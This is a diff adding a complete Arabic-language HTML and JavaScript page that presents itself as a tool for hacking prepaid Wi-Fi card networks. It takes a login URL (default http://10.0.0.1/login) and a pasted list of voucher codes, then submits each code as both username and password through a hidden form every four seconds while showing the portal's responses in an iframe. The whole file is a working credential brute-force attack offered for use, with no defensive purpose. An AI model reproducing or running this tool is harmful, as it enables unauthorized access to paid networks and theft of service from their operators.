@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>ALDMRY MAX MONITOR - موقع مدين لاختراق شبكات الكروت</title>
+  <style>
+    :root { --neon: #00ff41; --danger: #ff0000; --bg: #050505; --panel-width: 320px; }
+    
+    body, html { 
+      margin: 0; padding: 0; height: 100%; 
+      background: var(--bg); color: var(--neon); 
+      font-family: 'Courier New', monospace; overflow: hidden;
+    }
+
+    /* تقسيم الشاشة: لوحة تحكم نحيفة + نافذة ضخمة */
+    .wrapper { display: flex; height: 100vh; width: 100vw; }
+
+    /* لوحة التحكم الجانبية */
+    .sidebar { 
+      width: var(--panel-width); 
+      background: #0a0a0a; 
+      border-left: 2px solid var(--neon); 
+      display: flex; flex-direction: column; 
+      padding: 15px; box-sizing: border-box;
+      z-index: 10;
+    }
+
+    /* نافذة العرض الرئيسية (الضخمة) */
+    .main-monitor { 
+      flex-grow: 1; 
+      background: #111; 
+      display: flex; flex-direction: column;
+      position: relative;
+    }
+
+    .iframe-container { flex-grow: 1; background: #fff; position: relative; }
+    iframe { width: 100%; height: 100%; border: none; }
+
+    /* تنسيق العناصر */
+    h2 { font-size: 18px; text-align: center; border-bottom: 1px solid var(--neon); padding-bottom: 10px; color: white; }
+    textarea { flex-grow: 1; background: #000; color: var(--neon); border: 1px solid #333; padding: 10px; margin: 10px 0; resize: none; font-size: 14px; }
+    input { background: #000; color: #fff; border: 1px solid #444; padding: 8px; margin-bottom: 10px; width: 100%; box-sizing: border-box; }
+    
+    button { 
+      padding: 12px; margin: 5px 0; font-weight: bold; cursor: pointer; 
+      border-radius: 5px; border: none; transition: 0.3s;
+    }
+    .btn-run { background: var(--neon); color: #000; }
+    .btn-stop { background: var(--danger); color: #fff; }
+    button:hover { opacity: 0.8; transform: scale(1.02); }
+
+    .status-box { background: #1a1a1a; padding: 10px; border-radius: 5px; margin-top: 10px; font-size: 13px; border-right: 4px solid var(--danger); }
+    
+    /* شريط العنوان فوق النافذة */
+    .monitor-header { 
+      background: #222; padding: 10px; display: flex; 
+      justify-content: space-between; align-items: center; 
+      font-size: 14px; color: #fff; border-bottom: 2px solid var(--neon);
+    }
+
+    #log { height: 100px; font-size: 11px; overflow-y: auto; background: #000; margin-top: 10px; padding: 5px; border: 1px solid #222; }
+    .blink { animation: blinker 1s linear infinite; }
+    @keyframes blinker { 50% { opacity: 0; } }
+  </style>
+</head>
+<body>
+
+<div class="wrapper">
+  
+  <div class="sidebar">
+    <h2>موقع مدين لاختراق شبكات الكروت</h2>
+    
+    <label>رابط الشبكة:</label>
+    <input id="netUrl" value="http://10.0.0.1/login">
+    
+    <label>قائمة الكروت (أدخل الكروت هنا):</label>
+    <textarea id="cardList" placeholder="ضع الكروت هنا..."></textarea>
+    
+    <div class="status-box">
+      الحالة: <b id="statusText">جاهز</b><br>
+      الكرت الحالي: <b id="currentCard" style="color:white;">----</b>
+    </div>
+    
+    <button class="btn-run" onclick="startAttack()">تشغيل الهجوم</button>
+    <button class="btn-stop" onclick="stopAttack()">إيقاف</button>
+    
+    <div id="log"></div>
+  </div>
+
+  <div class="main-monitor">
+    <div class="monitor-header">
+      <span>📺 شاشة المراقبة الحية (استجابة الشبكة)</span>
+      <span id="timer" style="color: var(--neon);">التوقيت: 00:00</span>
+    </div>
+    
+    <div class="iframe-container">
+      <iframe id="netFrame" name="netFrame"></iframe>
+      <div id="loader" style="display:none; position:absolute; top:20px; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.8); padding:10px; border-radius:20px; color:white;">جاري تحديث الاستجابة...</div>
+    </div>
+  </div>
+
+</div>
+
+<form id="hackForm" method="POST" target="netFrame" style="display:none;">
+  <input type="hidden" name="username" id="formUser">
+  <input type="hidden" name="password" id="formPass">
+</form>
+
+<script>
+  let running = false;
+
+  function addLog(msg) {
+    const log = document.getElementById('log');
+    const time = new Date().toLocaleTimeString();
+    log.innerHTML = `<div>[${time}] ${msg}</div>` + log.innerHTML;
+  }
+
+  async function startAttack() {
+    const url = document.getElementById('netUrl').value;
+    const cards = document.getElementById('cardList').value.split('\n').filter(c => c.trim());
+    
+    if (cards.length === 0) return alert("الرجاء إضافة كروت أولاً!");
+
+    running = true;
+    document.getElementById('statusText').innerText = "جاري العمل...";
+    document.getElementById('statusText').className = "blink";
+    
+    const form = document.getElementById('hackForm');
+    form.action = url;
+
+    for (let i = 0; i < cards.length; i++) {
+      if (!running) break;
+
+      const card = cards[i].trim();
+      document.getElementById('currentCard').innerText = card;
+      addLog(`تجربة: ${card}`);
+
+      // تجهيز البيانات
+      document.getElementById('formUser').value = card;
+      document.getElementById('formPass').value = card;
+      
+      // إرسال للنافذة العملاقة
+      document.getElementById('loader').style.display = 'block';
+      form.submit();
+
+      // انتظار (4 ثواني) لتقرأ الرسالة بوضوح في النافذة الكبيرة
+      await new Promise(r => setTimeout(r, 4000));
+      document.getElementById('loader').style.display = 'none';
+    }
+
+    stopAttack();
+  }
+
+  function stopAttack() {
+    running = false;
+    document.getElementById('statusText').innerText = "متوقف";
+    document.getElementById('statusText').className = "";
+    addLog("تم إيقاف الهجوم.");
+  }
+</script>
+
+</body>
+</html>
